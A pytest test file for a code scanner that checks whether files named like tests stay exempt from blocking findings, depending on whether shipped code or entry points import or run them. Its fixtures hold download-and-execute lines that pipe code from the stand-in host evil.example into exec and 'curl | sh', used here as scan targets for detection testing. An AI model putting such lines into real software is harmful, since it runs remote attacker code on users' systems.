"""A test-named file is exempt from blocking only when it really is test code.

``test_*.py`` / ``*_test.py`` / anything under ``tests/`` used to be graded like test
code by NAME in a repository scan: its findings dropped to medium and never decided
the answer. Now (repo and local scans) the exemption needs the file to be test code
(a test directory, or a pytest / unittest / JS test-runner module) that no non-test
code, entry point, ``setup.py`` / ``pyproject.toml`` entry or ``package.json``
script imports or runs. Otherwise the file is graded as shipped code.
"""
from __future__ import annotations

import subprocess
from pathlib import Path

import pytest

from src.scanner import scan as scanmod
from src.scanner.local_scan import _walk_tree, scan_local
from src.scanner.scan import _finding_is_blocking
from src.scanner.test_files import is_test_code, judged, not_really_tests

BAD = "import requests\nexec(requests.get('https://evil.example/x').text)\n"
BAD_JS = "const cp = require('child_process');\ncp.execSync('curl -fsSL https://evil.example/x | sh');\n"
TESTS = "import pytest\n\ndef test_add():\n    assert 1 + 1 == 2\n"


def _tree(root: Path, files: dict[str, str]) -> None:
    for name, body in files.items():
        (root / name).parent.mkdir(parents=True, exist_ok=True)
        (root / name).write_text(body)
    subprocess.run(["git", "init", "-q"], cwd=root, check=True)
    subprocess.run(["git", "add", "-A"], cwd=root, check=True)


def _blocking(r, path: str) -> list:
    return [f for f in r.findings if f.file_path == path and _finding_is_blocking(f)
            and f.severity in ("critical", "high")]


def _sevs(r, path: str) -> set[str]:
    return {f.severity for f in r.findings if f.file_path == path and f.kind == "defect"}


@pytest.mark.parametrize("files,path", [
    # named like a test, holds no tests
    ({"test_helper.py": BAD, "main.py": "print(1)\n"}, "test_helper.py"),
    ({"pkg/net_test.py": BAD, "pkg/__init__.py": ""}, "pkg/net_test.py"),
    # a real test module the package imports
    ({"test_x.py": TESTS + BAD, "main.py": "import test_x\n"}, "test_x.py"),
    ({"pkg/test_x.py": TESTS + BAD, "pkg/main.py": "from pkg.test_x import go\n"},
     "pkg/test_x.py"),
    ({"pkg/test_x.py": TESTS + BAD, "pkg/main.py": "from . import test_x\n"},
     "pkg/test_x.py"),
    # under tests/, imported by running code
    ({"tests/helpers.py": BAD, "app/main.py": "from tests.helpers import run\n"},
     "tests/helpers.py"),
    ({"tests/helpers.py": BAD, "app.py": "import importlib\n"
      "m = importlib.import_module('tests.helpers')\n"}, "tests/helpers.py"),
    # named as a file to run by non-test code / an entry point
    ({"test_x.py": TESTS + BAD, "run.py": "import runpy\nrunpy.run_path('test_x.py')\n"},
     "test_x.py"),
    ({"test_x.py": TESTS + BAD,
      "setup.py": "from setuptools import setup\nsetup(name='p', entry_points={"
                  "'console_scripts': ['p = test_x:main']})\n"}, "test_x.py"),
    ({"test_x.py": TESTS + BAD,
      "pyproject.toml": "[project]\nname = 'p'\n[project.scripts]\np = 'test_x:main'\n"},
     "test_x.py"),
    ({"tests/run.js": "describe('x', () => {});\n" + BAD_JS,
      "package.json": '{"name":"p","scripts":{"start":"node tests/run.js"}}'},
     "tests/run.js"),
    ({"tests/run.js": BAD_JS, "package.json": '{"name":"p","main":"tests/run.js"}'},
     "tests/run.js"),
    ({"tests/util.js": BAD_JS, "index.js": "const u = require('./tests/util');\n",
      "package.json": '{"name":"p","main":"index.js"}'}, "tests/util.js"),
    ({"Procfile": "web: python test_x.py\n", "test_x.py": TESTS + BAD}, "test_x.py"),
])
def test_not_really_a_test_blocks(tmp_path, files, path):
    _tree(tmp_path, files)
    r = scan_local(tmp_path)
    assert _blocking(r, path), sorted((f.severity, f.name) for f in r.findings
                                      if f.file_path == path)


@pytest.mark.parametrize("files,path", [
    ({"test_x.py": TESTS + BAD, "main.py": "print(1)\n"}, "test_x.py"),
    ({"tests/helpers.py": BAD, "main.py": "print(1)\n"}, "tests/helpers.py"),
    ({"tests/test_x.py": TESTS + BAD, "tests/conftest.py": "from tests.test_x import a\n"},
     "tests/test_x.py"),
    # unittest
    ({"x_test.py": "import unittest\nclass T(unittest.TestCase):\n    pass\n" + BAD,
      "main.py": "print(1)\n"}, "x_test.py"),
    # run only by a test script / test tooling
    ({"tests/run.js": BAD_JS,
      "package.json": '{"name":"p","scripts":{"test":"node tests/run.js"}}'},
     "tests/run.js"),
    ({"test_x.py": TESTS + BAD, "noxfile.py": "session.run('pytest', 'test_x.py')\n"},
     "test_x.py"),
    ({"test_x.py": TESTS + BAD,
      "setup.py": "from setuptools import setup\nsetup(name='p', test_suite='test_x')\n"},
     "test_x.py"),
    # a different module of the same bare name elsewhere
    ({"tests/utils.py": BAD, "app/utils.py": "X = 1\n", "app/main.py": "from app import utils\n"
      "import utils\n"}, "tests/utils.py"),
])
def test_real_unused_tests_stay_exempt(tmp_path, files, path):
    _tree(tmp_path, files)
    r = scan_local(tmp_path)
    assert not _blocking(r, path)
    assert _sevs(r, path) and "critical" not in _sevs(r, path)


@pytest.mark.asyncio
async def test_hosted_path_agrees(tmp_path, monkeypatch):
    _tree(tmp_path, {"test_helper.py": BAD, "main.py": "import test_helper\n",
                     "tests/test_ok.py": TESTS + BAD})
    tree = _walk_tree(tmp_path)

    async def fake_tree(*a, **k):
        return (tree, False, True, "main")

    async def fake_content(owner, repo, path, token, ref=None, *a, **k):
        p = tmp_path / path
        return p.read_text(encoding="utf-8") if p.exists() else None

    async def fake_noop(*a, **k):
        return None

    async def fake_pkg(*a, **k):
        return {}

    monkeypatch.setattr(scanmod, "_fetch_repo_tree", fake_tree)
    monkeypatch.setattr(scanmod, "_fetch_file_content", fake_content)
    monkeypatch.setattr(scanmod, "_resolve_repo_package", fake_pkg)
    monkeypatch.setattr(scanmod, "_run_supply_chain", fake_noop)
    monkeypatch.setattr(scanmod, "_maybe_scan_artifact", fake_noop)
    monkeypatch.setattr(scanmod, "_maybe_maintainer_signals", fake_noop)
    hosted = await scanmod.scan_repo("owner/repo", token="x")
    local = scan_local(tmp_path)
    key = sorted((f.category, f.severity, f.file_path, f.line_number, f.name)
                 for f in hosted.findings)
    assert key == sorted((f.category, f.severity, f.file_path, f.line_number, f.name)
                         for f in local.findings)
    assert hosted.trust_score == local.trust_score
    assert _blocking(hosted, "test_helper.py")
    assert not _blocking(hosted, "tests/test_ok.py")


def test_only_test_exempt_files_are_judged():
    assert judged("test_x.py") and judged("tests/a.py") and judged("a/b_test.py")
    assert judged("__tests__/a.js")
    for p in ("examples/test_x.py", "docs/tests/a.py", "conftest.py", "a.test.js",
              "fixtures/test_x.py", "main.py", "tests/data.json"):
        assert not judged(p), p


def test_test_code_markers():
    assert is_test_code("test_x.py", "from unittest import mock\n")
    assert is_test_code("test_x.py", "def test_it():\n    pass\n")
    assert not is_test_code("test_x.py", "def testing_helper():\n    pass\n")
    assert is_test_code("x_test.js", "test('a', () => {});\n")
    assert is_test_code("tests/anything.py", "X = 1\n")


def test_bounded_to_the_texts_given():
    assert not_really_tests({"main.py": "x"}, runs_for_consumer=lambda q: True) == set()
